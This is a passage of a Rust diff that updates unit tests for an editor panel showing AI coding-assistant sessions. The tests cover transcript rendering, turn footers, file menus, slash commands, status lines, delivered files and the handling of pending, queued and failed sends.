+            without_origin_prompt.as_deref(),
+            Some(envelope),
+            "no origin must not unwrap a quoted envelope; got {:?}",
+            without_origin_prompt.as_deref()
+        );
+
+        let human_origin = record(
+            &serde_json::json!({
+                "type": "attachment",
+                "uuid": "human-origin",
+                "attachment": {
+                    "type": "queued_command",
+                    "prompt": envelope,
+                    "origin": {"kind": "human"},
+                },
+            })
+            .to_string(),
+        );
+        let human_origin_prompt = queued_command_prompt(&human_origin);
+        assert_eq!(
+            human_origin_prompt.as_deref(),
+            Some(envelope),
+            "origin.kind human must not unwrap a quoted envelope; got {:?}",
+            human_origin_prompt.as_deref()
+        );
+    }
+
+    #[test]
+    fn attachments_fold_after_the_user_message_of_their_turn() {
         let entries = entries_of(&[
             r#"{"type":"user","uuid":"a","message":{"content":"hello"}}"#,
             r#"{"type":"attachment","uuid":"b","attachment":{"type":"environment"},"rendered":[{"content":"env text"}]}"#,
@@ -9719,36 +13176,56 @@ mod tests {
         ]);
 
         assert_eq!(entries.len(), 2);
-        let EntryKind::Attachments { items } = &entries[0].kind else {
-            panic!("expected the attachments section first");
+        assert!(
+            matches!(entries[0].kind, EntryKind::Message { .. }),
+            "the user message leads the turn"
+        );
+        let EntryKind::Attachments { items } = &entries[1].kind else {
+            panic!("expected the attachments section after the user message");
         };
         assert_eq!(items.len(), 2);
         assert_eq!(items[0].label.as_ref(), "environment");
         assert_eq!(items[1].body.as_ref(), "diag text");
     }
 
-    /// The one record the CLI writes onto the conversation's chain with no content of
-    /// any kind: drawn as unrecognized JSON, it was the largest block in the
-    /// conversation and said only how many milliseconds the turn took.
+    /// Timing the CLI writes when a turn closes: how long it took, how many messages
+    /// were in it, and how many background agents are still running.
     #[test]
-    fn a_turn_duration_record_is_left_out_of_the_conversation() {
+    fn a_turn_duration_record_is_drawn_as_a_footer() {
         let entries = entries_of(&[
             r#"{"type":"user","uuid":"a","message":{"content":"hello"}}"#,
             r#"{"type":"system","subtype":"turn_duration","uuid":"b","parentUuid":"a",
-"durationMs":162711,"messageCount":1177}"#,
+"durationMs":272000,"messageCount":209,"pendingBackgroundAgentCount":2}"#,
         ]);
 
         assert_eq!(
             entries.len(),
-            1,
-            "the timing record has nothing for a reader and must not be drawn at all, \
-             but the conversation around it is kept; entry keys: {:?}",
+            2,
+            "the timing record closes the turn rather than being dropped; entry keys: {:?}",
             entries.iter().map(|entry| &entry.key).collect::<Vec<_>>()
         );
         assert!(
             matches!(entries[0].kind, EntryKind::Message { .. }),
-            "the message before it is what is left"
+            "the message before it is kept"
         );
+        match &entries[1].kind {
+            EntryKind::TurnFooter {
+                duration_ms,
+                message_count,
+                pending_background_agents,
+            } => {
+                assert_eq!(*duration_ms, 272000);
+                assert_eq!(*message_count, 209);
+                assert_eq!(*pending_background_agents, 2);
+            }
+            other => panic!(
+                "expected a turn footer, got {}",
+                match other {
+                    EntryKind::Unknown { label, .. } => label.to_string(),
+                    _ => "a different entry".to_string(),
+                }
+            ),
+        }
     }
 
     #[test]
@@ -10421,22 +13898,6 @@ mod tests {
         }
     }
 
-    /// Captured from a terminal asking the second of two questions. The strip is the only
-    /// thing read out of the screen, so the rest is here to show it is not.
-    const TWO_QUESTION_PANE: &str = "\
-←  ☒ Project shape  ☐ Extras  ✔ Submit  →
-
-Which extras should be on?
-
-❯ 1. [ ] CodeGraph index
-  Symbols and blast radius
-  2. [ ] Regression gate
-     Submit
-
-  5. Chat about this
-
-Enter to select · Tab/Arrow keys to navigate · Esc to cancel";
-
     fn command(name: &str, scope: SlashCommandScope) -> SlashCommand {
         SlashCommand {
             name: name.to_string(),
@@ -10524,55 +13985,164 @@ Enter to select · Tab/Arrow keys to navigate · Esc to cancel";
         );
     }
 
-    /// A call carrying one question draws no strip at all, and the reader is on its only
-    /// question. Counting nothing as "some other question" would draw the wrong one.
     #[test]
-    fn a_call_with_one_question_leaves_the_reader_on_it() {
-        let single = "\
- ☐ Options
+    fn file_menu_highlight_never_exceeds_the_rows_that_are_drawn() {
+        let files: Vec<SharedString> = (0..FILE_MENU_ROWS + 20)
+            .map(|index| SharedString::from(format!("src/file-{index}.rs")))
+            .collect();
+        let offered = matching_files(&files, "src");
+        let highlighted = step_through_menu(usize::MAX, offered.len(), MenuStep::Stay);
 
-Pick one:
+        assert_eq!(offered.len(), FILE_MENU_ROWS);
+        assert!(highlighted < offered.len());
+    }
 
-❯ 1. Alpha
-  2. Beta
+    #[test]
+    fn file_menu_locally_narrows_previous_matches_and_bare_at_opens_nothing() {
+        let previous = vec![
+            SharedString::from("src/panel.rs"),
+            SharedString::from("src/session_store.rs"),
+            SharedString::from("tests/panel_test.rs"),
+        ];
 
-Enter to select · ↑/↓ to navigate · Esc to cancel";
-
-        assert_eq!(question_being_asked(Some(single), &[]), 0);
         assert_eq!(
-            question_being_asked(None, &[]),
-            0,
-            "a terminal that could not be read leaves the reader where a call starts"
+            matching_files(&previous, "panel"),
+            vec![
+                SharedString::from("src/panel.rs"),
+                SharedString::from("tests/panel_test.rs"),
+            ],
+            "the previous host result stays visible after being narrowed locally"
         );
-        assert_eq!(
-            question_being_asked(Some("no question is on this screen at all"), &[]),
-            0
+        assert_eq!(file_being_named("@"), Some(""));
+        assert!(
+            matching_files(&previous, "").is_empty(),
+            "a bare @ draws no file menu"
         );
     }
 
-    /// The strip ticks the questions already answered, so the one being asked is the
-    /// count of ticks. Reading it wrong draws the reader the options of another question.
     #[test]
-    fn the_question_being_asked_is_the_one_after_the_answered_ones() {
-        assert_eq!(question_being_asked(Some(TWO_QUESTION_PANE), &[]), 1);
+    fn pasted_file_names_include_time_and_six_hex_hash_characters() {
+        let name = pasted_file_name(1_234, "png", b"same contents");
+        let hash = name
+            .strip_prefix("pasted-1234-")
+            .and_then(|name| name.strip_suffix(".png"))
+            .expect("the pasted-file name has the expected fixed parts");
 
-        let none_answered = TWO_QUESTION_PANE.replace('☒', "☐");
-        assert_eq!(question_being_asked(Some(&none_answered), &[]), 0);
-
-        let both_answered = TWO_QUESTION_PANE.replacen('☐', "☒", 1);
-        assert_eq!(question_being_asked(Some(&both_answered), &[]), 2);
+        assert_eq!(hash.len(), 6);
+        assert!(hash.chars().all(|character| character.is_ascii_hexdigit()));
+        assert_eq!(name, pasted_file_name(1_234, "png", b"same contents"));
+        assert_ne!(name, pasted_file_name(1_234, "png", b"different contents"));
+        assert_eq!(
+            pasted_path_for_message(
+                Path::new("/work/project/images/pasted.png"),
+                Some(Path::new("/work/project")),
+            ),
+            "@images/pasted.png"
+        );
+        assert_eq!(
+            pasted_path_for_message(
+                Path::new("/home/user/.claude/zed-pasted/pasted.png"),
+                Some(Path::new("/work/project")),
+            ),
+            "/home/user/.claude/zed-pasted/pasted.png"
+        );
     }
 
-    /// Nothing ticked is not an answer: walking to `Submit` and pressing it would submit
-    /// an empty one.
-    ///
-    /// What the rest of this test used to assert — the exact walk, counted from the last
-    /// ticked option — was measured against a real menu and found wrong; a digit does not
-    /// move the cursor there. The menu simulator above covers the walk now, against the
-    /// behaviour that was measured rather than against a key sequence.
     #[test]
-    fn nothing_ticked_is_not_an_answer() {
-        assert_eq!(keys_for_several_choices(&HashSet::default(), 3), None);
+    fn successful_uninstall_reports_the_manual_mcp_cleanup_command() {
+        let note = uninstall_hooks_note(Ok(()));
+        assert!(note.contains("Hooks uninstalled"));
+        assert!(note.contains("claude mcp remove zed-claude"));
+    }
+
+    #[test]
+    fn a_question_option_click_composes_the_exact_text() {
+        assert_eq!(
+            compose_single_question_answer("Shape", "Which shape?", "Circle"),
+            "Answer to \"Shape\": Circle"
+        );
+        assert_eq!(
+            compose_single_question_answer("", "Which extras?", "CodeGraph"),
+            "Answer to \"Which extras?\": CodeGraph"
+        );
+        assert_eq!(
+            compose_multi_question_answer(
+                "Extras",
+                &["CodeGraph".to_string(), "Tests".to_string()]
+            ),
+            "Answers to \"Extras\": CodeGraph; Tests"
+        );
+        assert_eq!(
+            compose_type_something_prefix("Shape", "Which shape?"),
+            "Answer to \"Shape\": "
+        );
+    }
+
+    #[test]
+    fn a_dialog_only_slash_command_is_not_sent() {
+        assert!(matches!(
+            slash_send_decision("/permissions"),
+            SlashSendDecision::OpenInTerminal
+        ));
+        assert!(matches!(
+            slash_send_decision("/login"),
+            SlashSendDecision::OpenInTerminal
+        ));
+        assert!(matches!(
+            slash_send_decision("/mcp"),
+            SlashSendDecision::OpenInTerminal
+        ));
+        assert!(matches!(
+            slash_send_decision("/mcp some-server"),
+            SlashSendDecision::SendAsText
+        ));
+    }
+
+    #[test]
+    fn an_argument_slash_command_without_an_argument_is_not_sent() {
+        match slash_send_decision("/model") {
+            SlashSendDecision::NeedsArgument { example } => {
+                assert_eq!(example, "add an argument, e.g. /model opus");
+            }
+            other => panic!("expected NeedsArgument, got a send decision of {other:?}"),
+        }
+        assert!(matches!(
+            slash_send_decision("/model opus"),
+            SlashSendDecision::SendAsText
+        ));
+        assert!(matches!(
+            slash_send_decision("hello"),
+            SlashSendDecision::SendAsText
+        ));
+    }
+
+    /// The status line under the input names channel liveness, not heartbeat age: clocks
+    /// disagree, and an age that contradicts "connected" is worse than no age.
+    #[test]
+    fn a_live_channel_draws_no_age_it_cannot_date() {
+        let now_ms = 1_700_000_000_000;
+        let line = format_status_line(&Turn::Idle, Some("default"), true, now_ms);
+        assert_eq!(
+            line, "● idle · mode: default · channel: connected",
+            "got {line:?}"
+        );
+        let line = format_status_line(&Turn::Idle, Some("default"), false, now_ms);
+        assert_eq!(
+            line, "● idle · mode: default · channel: not loaded — Setup",
+            "got {line:?}"
+        );
+        let line = format_status_line(
+            &Turn::Running {
+                since_ms: now_ms - 84_000,
+            },
+            Some("auto"),
+            true,
+            now_ms,
+        );
+        assert_eq!(
+            line, "● running 1:24 · mode: auto · channel: connected",
+            "got {line:?}"
+        );
     }
 
     /// The line above a run's cards is the part a reader sees without opening anything,
@@ -10899,6 +14469,134 @@ Enter to select · ↑/↓ to navigate · Esc to cancel";
         tool_result_body_with_home(json, Some(paths::home_dir()))
     }
 
+    /// The shape a `SendUserFile` delivery is recorded in: the tool result's own content
+    /// says only how many files were delivered, and `toolUseResult` names them.
+    fn send_user_file_line(attachments: Value, caption: &str) -> String {
+        serde_json::json!({
+            "type": "user",
+            "uuid": "b",
+            "message": { "content": [ {
+                "type": "tool_result",
+                "tool_use_id": "t1",
+                "content": "1 file delivered to user.",
+            } ] },
+            "toolUseResult": {
+                "caption": caption,
+                "display": "attach",
+                "attachments": attachments,
+            },
+        })
+        .to_string()
+    }
+
+    fn sent_files_of(line: &str) -> (Option<SharedString>, Vec<SentFile>) {
+        let entries = entries_of(&[TOOL_USE_LINE, line]);
+        match entries.get(1).map(|entry| &entry.kind) {
+            Some(EntryKind::SentFiles { caption, files, .. }) => (caption.clone(), files.clone()),
+            _ => panic!("expected the delivery to be shown as the files it delivered"),
+        }
+    }
+
+    #[test]
+    fn a_delivered_image_is_shown_as_the_image_rather_than_as_its_count() {
+        let (caption, files) = sent_files_of(&send_user_file_line(
+            serde_json::json!([{
+                "path": "/home/coder/project/renders/poster.png",
+                "size": 1_049_002,
+                "isImage": true,
+                "media_type": "image/png",
+                "pathValidated": true,
+            }]),
+            "the poster, 1080p",
+        ));
+
+        assert_eq!(caption.as_deref(), Some("the poster, 1080p"));
+        assert_eq!(files.len(), 1);
+        assert_eq!(files[0].name.as_ref(), "poster.png");
+        assert_eq!(
+            files[0].path,
+            PathBuf::from("/home/coder/project/renders/poster.png")
+        );
+        assert_eq!(files[0].size, Some(1_049_002));
+        assert!(files[0].is_image, "a delivery that says `isImage` means it");
+        assert_eq!(
+            sent_image_format(&files[0]),
+            Some(ImageFormat::Png),
+            "the media type the delivery recorded is what the image is decoded as"
+        );
+    }
+
+    #[test]
+    fn a_delivered_video_is_named_rather_than_decoded() {
+        let (_, files) = sent_files_of(&send_user_file_line(
+            serde_json::json!([{
+                "path": "/home/coder/project/out/preview-720p.mp4",
+                "size": 11_242_847,
+                "isImage": false,
+                "media_type": "video/mp4",
+                "pathValidated": true,
+            }]),
+            "720p preview",
+        ));
+
+        assert_eq!(files.len(), 1);
+        assert!(files[0].is_video());
+        assert!(!files[0].is_image);
+        assert_eq!(
+            sent_image_format(&files[0]),
+            None,
+            "there is no element that draws a video, so nothing is fetched for one"
+        );
+    }
+
+    #[test]
+    fn a_delivery_that_recorded_no_media_type_is_read_from_its_extension() {
+        let (caption, files) = sent_files_of(&send_user_file_line(
+            serde_json::json!([
+                { "path": "/home/coder/project/shot.JPG", "size": 2048 },
+                { "path": "/home/coder/project/packaging/uninstall.sh", "size": 7183 },
+            ]),
+            "   ",
+        ));
+
+        assert_eq!(
+            caption, None,
+            "a caption of nothing but spaces is no caption at all"
+        );
+        assert_eq!(files.len(), 2);
+        assert_eq!(
+            sent_image_format(&files[0]),
+            Some(ImageFormat::Jpeg),
+            "an extension in any case names the same format"
+        );
+        assert_eq!(
+            sent_image_format(&files[1]),
+            None,
+            "a file that is not an image is not decoded as one"
+        );
+    }
+
+    #[test]
+    fn a_result_that_delivered_no_files_is_still_a_tool_result() {
+        let no_attachments = serde_json::json!({
+            "type": "user",
+            "uuid": "b",
+            "message": { "content": [ {
+                "type": "tool_result",
+                "tool_use_id": "t1",
+                "content": "nothing was delivered",
+            } ] },
+            "toolUseResult": { "caption": "none", "display": "attach", "attachments": [] },
+        })
+        .to_string();
+
+        assert_eq!(
+            tool_result_body(&no_attachments),
+            ToolResultBody::Inline(SharedString::from("nothing was delivered")),
+            "an empty delivery leaves the result it answered showing its own text"
+        );
+    }
+
     #[test]
     fn structured_persisted_fields_inline_stdout_and_offer_the_full_output() {
         let output_path = paths::home_dir()
@@ -11179,7 +14877,7 @@ Enter to select · ↑/↓ to navigate · Esc to cancel";
             panic!("expected the user's own prompt to render as a message");
         };
         assert_eq!(
-            role.label(),
+            role.label().as_ref(),
             "You",
             "an ordinary user message must keep its own label"
         );
@@ -11188,7 +14886,7 @@ Enter to select · ↑/↓ to navigate · Esc to cancel";
             panic!("expected the compact summary to still render as a message");
         };
         assert_eq!(
-            role.label(),
+            role.label().as_ref(),
             "Summary",
             "a record with isCompactSummary: true was written by the compaction, not typed \
              by the user, and must not be labelled as if it were"
@@ -11281,103 +14979,31 @@ Enter to select · ↑/↓ to navigate · Esc to cancel";
         );
     }
 
-    /// A window holding nothing but the panel's input, built exactly as the panel
-    /// builds it. The panel itself needs a workspace and a project, and neither takes
-    /// part in what these tests are about: the rule that decides whether the answer to
-    /// a send may write into the input.
-    fn message_input(
-        cx: &mut gpui::TestAppContext,
-    ) -> (Entity<Editor>, &mut gpui::VisualTestContext) {
-        cx.update(|cx| {
-            let settings_store = settings::SettingsStore::test(cx);
-            cx.set_global(settings_store);
-            theme::init(theme::LoadThemes::JustBase, cx);
-        });
-
-        cx.add_window_view(|window, cx| {
-            let mut editor = Editor::auto_height(1, 8, window, cx);
-            editor.set_placeholder_text(MESSAGE_PLACEHOLDER, window, cx);
-            editor
-        })
-    }
-
-    /// What the panel does on the way out of `send_message`: it takes the text and
-    /// empties the input without waiting for the send to be answered.
-    fn take_the_text(
-        input: &Entity<Editor>,
-        text: &str,
-        cx: &mut gpui::VisualTestContext,
-    ) -> String {
-        input.update_in(cx, |editor, window, cx| {
-            editor.set_text(text, window, cx);
-            let taken = editor.text(cx);
-            editor.clear(window, cx);
-            taken
-        })
-    }
-
-    #[gpui::test]
-    async fn a_send_that_fails_hands_the_message_back(cx: &mut gpui::TestAppContext) {
-        let (input, cx) = message_input(cx);
-        let sent = take_the_text(&input, "the message that never arrived", cx);
-
-        cx.update(|window, cx| {
-            apply_send_outcome(
-                &input,
-                &sent,
-                Err(anyhow::anyhow!("can't find pane %9")),
-                window,
-                cx,
-            );
-        });
+    #[test]
+    fn a_failed_send_stays_failed_with_its_text_and_can_be_retried() {
+        let mut pending_sends = PendingSends::default();
+        let id = pending_sends.remember("session", "the message", &[]);
+        pending_sends.resolve(id, &Err(anyhow::anyhow!("offline")));
 
         assert_eq!(
-            input.update(cx, |editor, cx| editor.text(cx)),
-            "the message that never arrived",
-            "a send the user can do nothing about must not also cost them the message"
+            pending_sends.text(id).map(SharedString::as_ref),
+            Some("the message")
         );
-    }
-
-    #[gpui::test]
-    async fn a_send_that_fails_does_not_overwrite_what_the_user_typed_since(
-        cx: &mut gpui::TestAppContext,
-    ) {
-        let (input, cx) = message_input(cx);
-        let sent = take_the_text(&input, "the message that never arrived", cx);
-
-        // The send is answered a round trip later, and the user did not wait for it.
-        input.update_in(cx, |editor, window, cx| {
-            editor.set_text("what the user is typing now", window, cx)
-        });
-
-        cx.update(|window, cx| {
-            apply_send_outcome(
-                &input,
-                &sent,
-                Err(anyhow::anyhow!("can't find pane %9")),
-                window,
-                cx,
-            );
-        });
-
-        assert_eq!(
-            input.update(cx, |editor, cx| editor.text(cx)),
-            "what the user is typing now",
-            "the newer text is the user's; a failure from before it must not replace it"
+        assert!(
+            pending_sends
+                .sends
+                .first()
+                .is_some_and(|send| send.error.is_some())
         );
-    }
-
-    #[gpui::test]
-    async fn a_send_that_arrives_leaves_the_input_empty(cx: &mut gpui::TestAppContext) {
-        let (input, cx) = message_input(cx);
-        let sent = take_the_text(&input, "the message that arrived", cx);
-
-        cx.update(|window, cx| apply_send_outcome(&input, &sent, Ok(()), window, cx));
-
         assert_eq!(
-            input.update(cx, |editor, cx| editor.text(cx)),
-            "",
-            "a send that worked must leave the emptied input alone"
+            pending_sends.retry(id, &[]),
+            Some(SharedString::from("the message")),
+        );
+        assert!(
+            pending_sends
+                .sends
+                .first()
+                .is_some_and(|send| send.error.is_none())
         );
     }
 
@@ -11477,10 +15103,10 @@ Enter to select · ↑/↓ to navigate · Esc to cancel";
             ]),
             Activity::RunningTool {
                 name: SharedString::from("Read"),
-                target: SharedString::from("session_store.rs"),
+                target: SharedString::from("/Users/user/zed/crates/claude_sessions/s…"),
             },
-            "the file being read is what says which read is running; the path it sits at \
-             does not fit on the line"
+            "the file being read is the first preferred input field; a path that does not \
+             fit is truncated rather than reduced to its basename"
         );
 
         assert_eq!(
@@ -11495,9 +15121,9 @@ Enter to select · ↑/↓ to navigate · Esc to cancel";
             ]),
             Activity::RunningTool {
                 name: SharedString::from("WebSearch"),
-                target: SharedString::default(),
+                target: SharedString::from("gpui"),
             },
-            "a tool with no rule for naming its target is still worth reporting as running"
+            "query is a preferred target field, so a search names what it is looking for"
         );
 
         // A command longer than the line has room for: the head of it is what names the
@@ -11555,7 +15181,7 @@ Enter to select · ↑/↓ to navigate · Esc to cancel";
             ]),
             Activity::RunningTool {
                 name: SharedString::from("Write"),
-                target: SharedString::from("plan.md"),
+                target: SharedString::from("/tmp/notes/plan.md"),
             },
             "the call that is running is the newest one without a result, not the first \
              one in the turn"
@@ -11737,7 +15363,7 @@ Enter to select · ↑/↓ to navigate · Esc to cancel";
     fn a_sent_message_is_shown_before_the_transcript_has_it() {
         let entries = entries_of(&[&user_message_line("a", "an earlier message")]);
         let mut pending_sends = PendingSends::default();
-        pending_sends.remember(7, "the message I just sent", &entries);
+        pending_sends.remember("7", "the message I just sent", &entries);
 
         let shown = shown(&entries, &pending_sends);
         assert_eq!(
@@ -11779,7 +15405,7 @@ Enter to select · ↑/↓ to navigate · Esc to cancel";
 
         let before = user_message_entries_of(&[&user_message_line("a", "an earlier message")]);
         let mut pending_sends = PendingSends::default();
-        pending_sends.remember(7, "run the tests", &before);
+        pending_sends.remember("7", "run the tests", &before);
 
         let after =
             user_message_entries_of(&[&user_message_line("a", "an earlier message"), &queued]);
@@ -11819,7 +15445,7 @@ Enter to select · ↑/↓ to navigate · Esc to cancel";
 
         let before = user_message_entries_of(&[&user_message_line("a", "an earlier message")]);
         let mut pending_sends = PendingSends::default();
-        pending_sends.remember(7, "look at this", &before);
+        pending_sends.remember("7", "look at this", &before);
 
         let after =
             user_message_entries_of(&[&user_message_line("a", "an earlier message"), &queued]);
@@ -11858,7 +15484,7 @@ Enter to select · ↑/↓ to navigate · Esc to cancel";
     fn a_pending_message_goes_when_its_record_arrives() {
         let before = entries_of(&[&user_message_line("a", "an earlier message")]);
         let mut pending_sends = PendingSends::default();
-        pending_sends.remember(7, "run the tests", &before);
+        pending_sends.remember("7", "run the tests", &before);
         assert_eq!(
             pending_texts(&shown(&before, &pending_sends)).len(),
             1,
@@ -11892,10 +15518,189 @@ Enter to select · ↑/↓ to navigate · Esc to cancel";
     }
 
     #[test]
+    fn a_pending_send_comes_down_when_its_channel_record_arrives() {
+        let typed = "可以了 channel connected";
+        let mut pending_sends = PendingSends::default();
+        pending_sends.remember("7", typed, &[]);
+        let pending_before = pending_sends.entries();
+        assert_eq!(
+            pending_before.len(),
+            1,
+            "the send is drawn until the channel record arrives"
+        );
+        let pending_note_and_text = match &pending_before[0].kind {
+            EntryKind::Pending { note, text, .. } => format!("{note} / {text}"),
+            _ => "not a pending row".to_string(),
+        };
+
+        let after = user_message_entries_of(&[&channel_record_line(
+            "ff1c744b-channel",
+            &channel_envelope(typed),
+        )]);
+        let compared = user_messages(&after);
+        pending_sends.pair_with(&after);
+
+        assert_eq!(
+            pending_sends.entries().len(),
+            0,
+            "the channel record is the send arriving; pending note and text: \
+             {pending_note_and_text}; compared against: {compared:?}"
+        );
+    }
+
+    fn queued_texts(entries: &[Entry]) -> Vec<SharedString> {
+        entries
+            .iter()
+            .filter_map(|entry| match &entry.kind {
+                EntryKind::Queued { text } => Some(text.clone()),
+                _ => None,
+            })
+            .collect()
+    }
+
+    /// The queue log holds the line Claude Code was handed, envelope and all. Drawn
+    /// verbatim it put the three literal `<channel …>` lines on screen under a `Queued`
+    /// label, which is where the reader first saw this bug.
+    #[test]
+    fn a_queued_channel_message_is_drawn_as_its_inner_text() {
+        let typed = "可以了 channel connected";
+        let queued = vec![SharedString::from(channel_envelope(typed))];
+        let entries = queued_entries(&queued, &PendingSends::default(), Some("session-a"));
+
+        let texts = queued_texts(&entries);
+        assert_eq!(
+            texts,
+            vec![SharedString::from(typed)],
+            "a queue row is the reader's own words, not the envelope they travelled in"
+        );
+        assert!(
+            !entries.iter().any(entry_holds_channel_open),
+            "no <channel survives in a queue row; got {texts:?}"
+        );
+    }
+
+    /// A message sent from Zed is in the session's queue as well as in the panel's own
+    /// pending row. Compared raw, the queue entry never matched the send, so the one
+    /// message was drawn twice: a `Queued` row holding the envelope, and the pending row.
+    #[test]
+    fn a_queued_channel_message_the_panel_sent_is_not_drawn_twice() {
+        let typed = "可以了 channel connected";
+        let mut pending_sends = PendingSends::default();
+        pending_sends.remember("session-a", typed, &[]);
+        let queued = vec![SharedString::from(channel_envelope(typed))];
+
+        let entries = queued_entries(&queued, &pending_sends, Some("session-a"));
+        assert_eq!(
+            queued_texts(&entries),
+            Vec::<SharedString>::new(),
+            "the pending row already draws this message; pending rows: {:?}",
+            pending_texts(&pending_sends.entries())
+        );
+
+        // The same envelope while another session is selected is not this session's
+        // message, and the unwrapping must not start swallowing it.
+        assert_eq!(
+            queued_texts(&queued_entries(&queued, &pending_sends, Some("session-b"))),
+            vec![SharedString::from(typed)],
+            "another session's queue entry is still a row of its own"
+        );
+    }
+
+    /// The pairing the queue rows lean on predates the channel, and unwrapping must not
+    /// cost it: a plain queued message that matches a pending send is still left to it.
+    #[test]
+    fn a_queued_message_that_is_not_wrapped_still_matches_its_pending_send() {
+        let mut pending_sends = PendingSends::default();
+        pending_sends.remember("session-a", "run the tests", &[]);
+        let queued = vec![
+            SharedString::from("run the tests"),
+            SharedString::from("and then deploy"),
+        ];
+
+        assert_eq!(
+            queued_texts(&queued_entries(&queued, &pending_sends, Some("session-a"))),
+            vec![SharedString::from("and then deploy")],
+            "only the message that has no pending row of its own is drawn here"
+        );
+    }
+
+    /// What the new boundary could wrongly cut: the queue log carries no origin field, so
+    /// a line is unwrapped only when it is nothing but an envelope. A message typed at the
+    /// terminal that quotes the tags keeps every character of them.
+    #[test]
+    fn a_queued_message_that_only_quotes_the_tags_is_kept_whole() {
+        let quoting = "the wrapper is <channel source=\"zed-claude\"> … </channel>, see?";
+        let trailing = "wrap it in <channel source=\"zed-claude\"></channel>";
+        let queued = vec![
+            SharedString::from(quoting),
+            SharedString::from(trailing),
+            SharedString::from("<channels> is not the tag"),
+        ];
+
+        assert_eq!(
+            queued_texts(&queued_entries(
+                &queued,
+                &PendingSends::default(),
+                Some("7")
+            )),
+            vec![
+                SharedString::from(quoting),
+                SharedString::from(trailing),
+                SharedString::from("<channels> is not the tag"),
+            ],
+            "only a line that is nothing but an envelope is unwrapped"
+        );
+    }
+
+    /// One record is one message arriving, whichever wrapper it arrived in.
+    #[test]
+    fn one_channel_record_takes_only_the_older_of_two_equal_sends_down() {
+        let typed = "run the tests";
+        let mut pending_sends = PendingSends::default();
+        let older = pending_sends.remember("7", typed, &[]);
+        let newer = pending_sends.remember("7", typed, &[]);
+
+        let after = user_message_entries_of(&[&channel_record_line(
+            "ff1c744b-channel",
+            &channel_envelope(typed),
+        )]);
+        pending_sends.pair_with(&after);
+
+        assert_eq!(
+            pending_ids(&pending_sends),
+            vec![newer],
+            "the older send ({older}) is the one that arrived; the newer ({newer}) is \
+             still waiting"
+        );
+    }
+
+    /// A send belongs to the session it was sent to: another session's conversation is
+    /// not where it arrives, however alike the two texts are.
+    #[test]
+    fn a_channel_record_of_another_session_leaves_this_rows_alone() {
+        let typed = "可以了 channel connected";
+        let mut pending_sends = PendingSends::default();
+        pending_sends.remember("session-a", typed, &[]);
+
+        let after = user_message_entries_of(&[&channel_record_line(
+            "ff1c744b-channel",
+            &channel_envelope(typed),
+        )]);
+        pending_sends.pair_with_session(&after, "session-b");
+
+        assert_eq!(
+            pending_texts(&pending_sends.entries()),
+            vec![SharedString::from(typed)],
+            "session-a's message is still waiting; a record read while session-b is \
+             selected says nothing about it"
+        );
+    }
+
+    #[test]
     fn a_record_of_other_text_leaves_a_pending_message_alone() {
         let before = entries_of(&[&user_message_line("a", "an earlier message")]);
         let mut pending_sends = PendingSends::default();
-        pending_sends.remember(7, "run the tests", &before);
+        pending_sends.remember("7", "run the tests", &before);
         assert_eq!(pending_texts(&shown(&before, &pending_sends)).len(), 1);
 
         let after = entries_of(&[
@@ -11926,7 +15731,7 @@ Enter to select · ↑/↓ to navigate · Esc to cancel";
         // compaction is not in the active path.
         let on_screen = entries_of(&[&newer]);
         let mut pending_sends = PendingSends::default();
-        pending_sends.remember(7, "keep going", &on_screen);
+        pending_sends.remember("7", "keep going", &on_screen);
 
         // The same conversation with the compacted-away turn revealed.
         let whole_history = entries_of(&[&older, &newer]);
@@ -11948,7 +15753,7 @@ Enter to select · ↑/↓ to navigate · Esc to cancel";
     fn a_pending_message_is_paired_after_the_record_it_was_measured_against_is_compacted_away() {
         let on_screen = entries_of(&[&user_message_line("a", "and now this")]);
         let mut pending_sends = PendingSends::default();
-        pending_sends.remember(7, "keep going", &on_screen);
+        pending_sends.remember("7", "keep going", &on_screen);
 
         let after_compaction = entries_of(&[&user_message_line("c", "keep going")]);
         pending_sends.pair_with(&after_compaction);
@@ -11967,7 +15772,7 @@ Enter to select · ↑/↓ to navigate · Esc to cancel";
     #[test]
     fn the_first_message_of_a_conversation_is_paired_with_the_record_that_arrives() {
         let mut pending_sends = PendingSends::default();
-        pending_sends.remember(7, "the very first thing I said", &[]);
+        pending_sends.remember("7", "the very first thing I said", &[]);
 
         let arrived = entries_of(&[&user_message_line("a", "the very first thing I said")]);
         pending_sends.pair_with(&arrived);
@@ -11985,8 +15790,8 @@ Enter to select · ↑/↓ to navigate · Esc to cancel";
         // cannot be what either send became.
         let before = entries_of(&[&user_message_line("a", "keep going")]);
         let mut pending_sends = PendingSends::default();
-        let first = pending_sends.remember(7, "keep going", &before);
-        let second = pending_sends.remember(7, "keep going", &before);
+        let first = pending_sends.remember("7", "keep going", &before);
+        let second = pending_sends.remember("7", "keep going", &before);
 
         pending_sends.pair_with(&before);
         assert_eq!(
@@ -12020,56 +15825,425 @@ Enter to select · ↑/↓ to navigate · Esc to cancel";
     }
 
     #[test]
-    fn a_send_that_failed_takes_its_pending_message_down() {
+    fn a_send_that_failed_keeps_its_pending_message_for_retry() {
         let mut pending_sends = PendingSends::default();
-        let failed = pending_sends.remember(7, "the message that never arrived", &[]);
-        let arrived = pending_sends.remember(7, "the message that did", &[]);
+        let failed = pending_sends.remember("7", "the message that never arrived", &[]);
+        let arrived = pending_sends.remember("7", "the message that did", &[]);
         assert_eq!(pending_ids(&pending_sends), vec![failed, arrived]);
 
-        pending_sends.resolve(arrived, &Ok(()));
+        pending_sends.resolve(arrived, &Ok("0000000000001-0001.json".to_string()));
         assert_eq!(
             pending_ids(&pending_sends),
             vec![failed, arrived],
             "a send that arrived is waiting for its record to be written, not finished"
         );
 
-        pending_sends.resolve(failed, &Err(anyhow::anyhow!("can't find pane %9")));
+        pending_sends.resolve(
+            failed,
+            &Err(anyhow::anyhow!("Zed channel is not loaded in this session")),
+        );
         assert_eq!(
             pending_ids(&pending_sends),
-            vec![arrived],
-            "a send that failed will never have a record, and the text goes back to the \
-             input instead"
+            vec![failed, arrived],
+            "a failed send remains visible so it can be retried or copied"
+        );
+        assert_eq!(
+            pending_sends.text(failed).map(SharedString::as_ref),
+            Some("the message that never arrived")
+        );
+        assert!(
+            pending_sends
+                .sends
+                .iter()
+                .find(|send| send.id == failed)
+                .is_some_and(|send| send.error.is_some())
+        );
+    }
+
+    /// Retry is the same message again, not a paraphrase of it: what Retry hands back is
+    /// what Copy yields and what the failed row shows, whichever alphabet it is in and
+    /// however many lines it has. A second failure leaves the row where it is.
+    #[test]
+    fn retry_hands_back_the_text_that_failed_and_a_second_failure_keeps_the_row() {
+        for original in [
+            "請把 tests 跑一遍 — and report back",
+            "first line\nsecond line\n  indented third",
